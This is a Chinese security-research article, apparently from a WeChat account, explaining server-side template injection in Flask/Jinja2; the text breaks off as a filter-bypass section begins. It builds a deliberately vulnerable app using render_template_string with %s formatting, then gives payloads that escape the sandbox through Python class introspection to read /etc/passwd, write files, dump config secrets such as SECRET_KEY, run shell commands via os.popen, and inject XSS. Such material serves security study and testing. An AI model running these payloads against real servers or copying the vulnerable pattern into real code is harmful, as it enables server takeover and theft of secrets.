---
title: 详解Flask框架SSTI攻击的利用与绕过技巧
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247500277&idx=1&sn=aa8cc548b2f0f12aa907d6ca6deb5097&chksm=fa52144bcd259d5db12e698745e119110dea1979fe5f696551dd3e51eea46cad3b80d1c9c2a3&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2023-03-07
fetch_date: 2025-10-04T08:49:26.482547
---

# 详解Flask框架SSTI攻击的利用与绕过技巧

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib5SoQSz6wibZaI7FttxgPe90c3OhAFwAae9ICd6A9MHanM6CS1FzoeEuw/0?wx_fmt=jpeg)

# 详解Flask框架SSTI攻击的利用与绕过技巧

原创

ye1s

山石网科安全技术研究院

Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。Flask使用 BSD 授权。Flask也被称为 “microframework” ，因为它使用简单的核心，用 extension 增加其他功能。Flask没有默认使用的数据库、窗体验证工具。

SSTI(Server-Side Template Injection)即服务端模板注入攻击,这里为Flask 框架的模版渲染引擎 jinja2 的SSTI，模板渲染其实并没有漏洞，主要是开发者编写代码不规范导致了SSTI。

**0****1**

**Flask SSTI基础**

##

## **1.1   模版和模版引擎**

模版简单理解一段内容中存在可动态替换的部分。模版引擎就是做好一个模板后套入对应位置的数据，最终以html的格式展示出来。

模板引擎可以让网站程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。

Jinja2是Flask作者开发的一个模版引擎，在Jinja2中，存在三种语句：控制结构 {% %}、变量取值 {{ }}、注释 {# #}。

## **1.2   模版渲染函数**

Flask提供两个模版渲染函数 render\_template() 和render\_template\_string()。

### **1.2.1    render\_template**

render\_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容。

创建test.py，并启动

```
from flask import Flaskfrom flask import request, render_templateapp = Flask(__name__)@app.route('/')def test_ssti():    name="test"    if request.args.get('name'):        name = request.args.get('name')    return render_template("index.html", name=name) if __name__ == "__main__":    app.run(debug=True)
```

在当前目录新建templates目录，在其中新建index.html

```
<h1>Hello {{ name }}!</h1>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib5ibjeeGKXQaQSCNt3Da4772x1S6kY346tiazkicDiag1JajXZs3WJ6h2IZQ/640?wx_fmt=png)

HTML内容中是以这种变量取值语句的形式来处理传入的参数的，此时name的值无论是什么内容，都会被当作是字符串来进行处理而非模板语句来执行，比如即使传入的是config来构成，但其也只会把参数值当作是字符串而非模板语句。

### **1.2.2     render\_template\_string**

render\_template\_string()函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可。

```
from flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route('/')def test_ssti():    name="test"    if request.args.get('name'):        name = request.args.get('name')    template = '<h1>Hello {{ name }}!</h1>'    return render_template_string(template, name=name)if __name__ == "__main__":    app.run(debug=True)
```

## **1.3   SSTI成因**

SSTI漏洞点为在render\_template\_string()函数中，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击.

```
from flask import Flaskfrom flask import request, render_template_stringapp = Flask(__name__)@app.route('/')def test_ssti():    name="test"    if request.args.get('name'):        name= request.args.get('name')    template = '<h1>Hello %s!</h1>' % name    return render_template_string(template, name=name) if __name__ == "__main__":    app.run(debug=True)
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib5dI56M8PtAKdx1ryq7ficqAxWw5fIqrzEeV6YQy6JSaOIMjST9W18ypw/640?wx_fmt=png)

{{}}内能够解析表达式和代码，但直接插入import os;os.system('whoami') 是无法执行的，Jinjia 引擎限制了使用import，这时可以利用python的魔法方法和一些内置属性。

**0****2‍**

**沙箱逃匿‍**

## **2.1   魔术方法**

python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔术方法起到了不可比拟的作用。

```
__class__ 返回一个实例所属的类__mro__ 查看类继承的所有父类，直到object__subclasses__() 获取一个类的子类，返回的是一个列表__bases__ 返回一个类直接所继承的类（元组形式）__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化__globals__  使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典，与func_globals等价__getattribute__ 当类被调用的时候，无条件进入此函数。__getattr__ 对象中不存在的属性时调用__dict__ 返回所有属性，包括属性，方法等__builtins__ 方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数
```

无法直接使用import导入模块,不过通过魔术方法和一些内置属性可以找到很多基类和子类,有些基类和子类是存在一些引用模块的,只要我们初始化这个类,再利用\_\_globals\_\_调用可利用的函数，就可以进行利用。

## **2.2   沙箱逃匿流程**

---

**1.获取object类**

python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过\_\_mro\_\_ 和 \_\_bases\_\_两种方式来创建。

\_\_mro\_\_属性获取类的MRO(方法解析顺序)，也就是继承关系。

```
().__class__.__bases__[0]{}.__class__.__bases__[0][].__class__.__bases__[0]''.__class__.__bases__[0] #python3
```

\_\_bases\_\_属性可以获取上一层的继承关系，如果是多层继承则返回上一层的东西，可能有多个。

```
().__class__.__mro__[1]{}.__class__.__mro__[1][].__class__.__mro__[1]''.__class__.__mro__[1]#python3''.__class__.__mro__[2]#python2
```

---

**2.获取子类列表**

然后通过object类的\_\_subclasses\_\_()方法获取所有的子类列表，查看可用的类。

```
().__class__.__bases__[0].__subclasses__()
```

若类中有file，考虑读写操作. (python2)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib5HgU1JxqCysiaLuBQCribWkB8o1sMuk41zvCVYpCShibqic62DjCsHt0VVA/640?wx_fmt=png)

```
[].__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()[].__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt', 'w').write('xxx’)
```

(2)找到重载过的\_\_init\_\_类。

在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有\_\_globals\_\_属性。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib59cINiavHSj1LwmgqHboYsRByO4wibT3r1xK2vkjcK05Fq2aW0EBohKfQ/640?wx_fmt=png)

写个脚本帮我们来筛选出重载过的init类的类：

```
l=len([].__class__.__mro__[1].__subclasses__())for i in range(l):    if 'wrapper' not in str([].__class__.__mro__[1].__subclasses__()[i].__init__):        print(i,[].__class__.__mro__[1].__subclasses__()[i])
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQSZX84Oaup04bwyLicPDsib5Z9ZiaCRrNKHZrOWUjHa5zBxRVbTVOEjiah8MfIOwo9y5sVTicvD4XcWOA/640?wx_fmt=png)

重载过的\_\_init\_\_类的类具有\_\_globals\_\_属性，这里以WarningMessage为例，会返回很多dict类型。

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__
```

寻找keys中的\_\_builtins\_\_来查看引用，这里同样会返回很多dict类型：

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']
```

相关利用如下：

\_\_builtins\_\_利用

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() [].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()
```

linecache利用

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].system('whoami’)[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('whoami’)[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('ls’)
```

sys利用

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].system('whoami')
```

**0****3‍**

**漏洞利用**

## **3.1   XSS**

传入什么返回什么，直接输入XSS语句。%s传入的参数不会进行HTML编码的，因为Flask并没有将整个内容视为字符串。

```
?name=<script>alert(1);</script>
```

**3.2   敏感信息泄漏**

config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET\_KEY等敏感值。某些情况下，当获取secret\_key后，即可对session进行重新签名，完成session的伪造。

```
?name={{config}}?name={{self.__dict__}}?name={{url_for.__globals__['current_app'].config}}?name={{get_flashed_messages.__globals__['current_app'].config}}
```

## **3.3   文件读取**

python2

```
?name={{''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()}}''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()?name=''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/passwd').read()
```

python3(无file，只能用open)

```
?name=''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['open']('E:/passwd').read()
```

\_\_subclasses\_\_()[数字]在不同的python版本中类的位置序号可能不同，应根据具体的python环境修改为相应类的位置序号。

## **3.4   文件写入**

python2

```
?name={{''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd','w').write('test')}}''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd','w').write('test')?name=''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd','w').write('test')
```

## **3.5   命令执行**

```
?name={{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('whoami').read()}}?name={{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('platform').popen('whoami').read()}}
```

**0****4‍**

**过滤绕过‍‍**

## **4.1   过滤关键字**

### **4.1.1      字符串拼接绕过**

...